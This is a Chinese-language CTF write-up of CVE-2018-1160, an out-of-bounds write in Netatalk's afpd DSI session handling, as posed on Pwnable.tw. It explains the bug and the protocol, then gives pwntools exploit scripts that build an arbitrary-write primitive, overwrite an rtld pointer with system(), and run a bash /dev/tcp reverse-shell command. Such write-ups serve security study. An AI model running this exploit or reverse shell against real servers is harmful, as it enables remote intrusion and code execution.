---
title: 和徐老一起学Pwn 之 Pwnable CVE-2018-1160
categories:
- CTF/Pwn
tags: 
---

> 更新中...和徐老一起完成

## 简介

这个洞是2018年被发现，2019年被用到了HITCON Quals上，后又被收录到Pwnable.tw。所以主要有以下三部分文章：

- 原文：[Exploiting an 18 Year Old Bug](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)
- 翻译：[Netatalk CVE-2018-1160的发现与利用](https://blog.csdn.net/weixin_43483799/article/details/113856715)
- 复现：[Netatalk CVE-2018–1160 越界写漏洞分析](https://xz.aliyun.com/t/3710)


hitcon相关：

- [HITCON CTF 2019 Pwn 371 Netatalk](https://ddaa.tw/hitconctf_pwn_371_netatalk.html)
- [HITCON CTF 2019 Quals netatalk by balsn](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk)


Pwnable相关：

- [CVE-2018-1160 netatalk越界漏洞复现及分析](https://ama2in9.top/2021/01/07/cve-2018-1160/)
- [Netatalk CVE-2018-1160 分析](https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/)
- [CVE-2018-1160: Expanding the original 18 year old vulnerability exploit](https://tacopwn.net/blog/2021/08/02/cve-2018-1160-expanding-the-original-18-year-old-vulnerability-exploit/)
- [pwnable.tw CVE-2018-1160 Write up](https://katolik-xixon.tistory.com/244)

## 分析

### 漏洞

> 题目给了二进制、配置文件、需要的运行库，所以不需要编译以及安装其他依赖即可运行。

源码：[https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/](https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/)

主要目标二进制是：afpd、libatalk.so.18，他们在源码中的路径是：

- **/netatalk-3.1.11/etc/afpd/**
- **/netatalk-3.1.11/libatalk/**

漏洞点在 **/netatalk-3.1.11/libatalk/dsi/dsi_opensess.c** 的 **dsi_opensession** 函数中的 **memcpy**：

```c
/* /netatalk-3.1.11/libatalk/dsi/dsi_opensess.c */

void dsi_opensession(DSI *dsi)
{
  ...
  while (i < dsi->cmdlen) {
    switch (dsi->commands[i++]) {
    case DSIOPT_ATTNQUANT:
      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
      dsi->attn_quantum = ntohl(dsi->attn_quantum);
  ...
```

其中memcpy的长度参数 **dsi->commands\[i\]** 由外部传入，且没检查大小，导致可溢出到DSI结构体中attn_quantum的后续成员。

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

typedef struct DSI {
    ...
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */
    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
```

但可见成员 **commands** 的类型为uint8_t*，所以memcpy的最大长度是0xff，故其实只能溢出如上这些成员。并且由于 **DSI_DATASIZ** 为65535，所以溢出部分data后就无法向后溢出了。

### 交互

开始看这个memcpy的参数一头雾水，为啥拷贝的源地址，和长度都与 **dsi->commands** 相关：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

而且开头还有个switch里++，越看越费解。所以首先我应该知道dsi是个啥。在源码中没有查到dsi全称，然后发现漏洞原文中有wireshark的截图，并且可以看到wireshark支持解析这个协议，那应该是个挺标准的协议。Google搜索 **dsi_opensession protocol** 即可搜到：[Data Stream Interface](https://en.wikipedia.org/wiki/Data_Stream_Interface)，对照其协议格式，和漏洞PoC：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/poc.png)


发现，PoC中的header就是符合dsi协议的字段，协议中的Payload就是PoC中的commands，可看到commands的构成是：

```python
commands = "\x01"   # DSIOPT_ATTNQUANT 选项的值
commands += "\x80"  # 数据长度
commands += "\xaa" * 0x80
```

再对应memcpy，基本就能看明白了：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

其中DSIOPT_ATTNQUANT为0x1：

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSIOPT_ATTNQUANT 0x01   /* attention quantum */
```

所以memcpy就是从commands数据中按顺序解析出三个元素：功能码，数据长度，数据载荷。所以，也就是由于拷贝的需要的两个参数是揉在一段数据里，并且没有变量名标识，导致看起来比较费解。


那么最终的交互，其实就是构造一个dsi数据包，然后给目标的tcp相应端口发过去。比如我们溢出server_quantum，这个字段可在回包中收到：

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("chall.pwnable.tw",10002)

cmd  = b'\x01'+ p8(0xc)+ b'a'*0xc
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

测试的确可以收到4个a：

```python
➜   python3 exp.py
[+] Opening connection to chall.pwnable.tw on port 10002: Done
[DEBUG] Sent 0x1e bytes:
    00000000  00 04 00 01  00 00 00 00  00 00 00 0e  00 00 00 00  │····│····│····│····│
    00000010  01 0c 61 61  61 61 61 61  61 61 61 61  61 61        │··aa│aaaa│aaaa│aa│
    0000001e
[DEBUG] Received 0x1c bytes:
    00000000  01 04 00 01  00 00 00 00  00 00 00 0c  00 00 00 00  │····│····│····│····│
    00000010  00 04 61 61  61 61 02 04  00 00 00 80               │··aa│aa··│····│
    0000001c
[*] Closed connection to chall.pwnable.tw port 10002
```

如果想看到清晰的协议格式，可以用wireshark，但因为端口不是协议默认，故需要手动让其识别：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/wireshark.png)


### 调试

上面的交互的确看起来触发漏洞并覆盖了变量，不过想看到内存破坏还是得调试

### 源码


> 连接初始化

```c
afpd:

main -> configinit -> dsi_init (libatalk)

libatalk:

dsi_init -> dsi_tcp_init ->  dsi->proto_open = dsi_tcp_open
```

> 连接

```c

afpd:

main -> dsi_start -> dsi_getsession (libatalk)


libatalk:

dsi_getsession  -> dsi->proto_open -> dsi_tcp_open -> fork
```

> bug

```c
afpd:

main -> dsi_start -> dsi_getsession (libatalk)

libatalk:

dsi_getsession -> dsi_opensession (bug!!!)

```

> dsi->commands 初始化

```c
afpd:

main -> dsi_start -> dsi_getsession (libatalk)


libatalk:

dsi_getsession  -> dsi->proto_open -> dsi_tcp_open ->

dsi_init_buffer -> dsi->commands = malloc(dsi->server_quantum)

// 故一个tcp连接init一次dsi->commands
```

>  exploit 

```c
// dsi_stream_write:    just write a bunch of bytes.
// dsi_stream_read:     just read a bunch of bytes.
// dsi_stream_send:     send a DSI header + data.
// dsi_stream_receive:  read a DSI header + data.


afpd:

main -> dsi_start -> afp_over_dsi -> dsi_stream_receive (libatalk)

libatalk: 

dsi_stream_receive -> dsi_stream_read(dsi, dsi->commands, dsi->cmdlen)
```

## 利用

```python
from pwn import *
context(endian='big')

libc =ELF("./libc.so.re")
ip = "chall.pwnable.tw"
port = 10002

def aaw(addr,data):
    payload  = b'\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr,endian='little')
    dsi  = b'\x00\x04\x00\x01' 
    dsi += p32(0)
    dsi += p32(len(payload)) 
    dsi += p32(0)
    dsi += payload
    io.send(dsi)
    io.recv()

    dsi  = b'\x00\x04\x00\x01' 
    dsi += p32(0)
    dsi += p32(len(data)) 
    dsi += p32(0)
    dsi += data
    io.send(dsi)
    
leak_addr = b'\x00\x00\xc9\xbc\xa9\x7f\x00\x00'
log.success(hexdump(leak_addr))
leak_addr = u64(leak_addr,endian='little') + 0x2000
log.success(hex(leak_addr))

libc.address = leak_addr - 0xecc000
rtld = libc.address + 0xed2060

log.success(hex(libc.address))
log.success(hex(rtld))
log.success(hex(rtld+2312))

re_shell = b'bash -c "bash  -i>& /dev/tcp/ip/port 0<&1"'
io = remote(ip,port)
aaw(rtld+2312,re_shell.ljust(0x5f8,b'\x00')+p64(libc.symbols['system'],endian='little'))
io.close()
```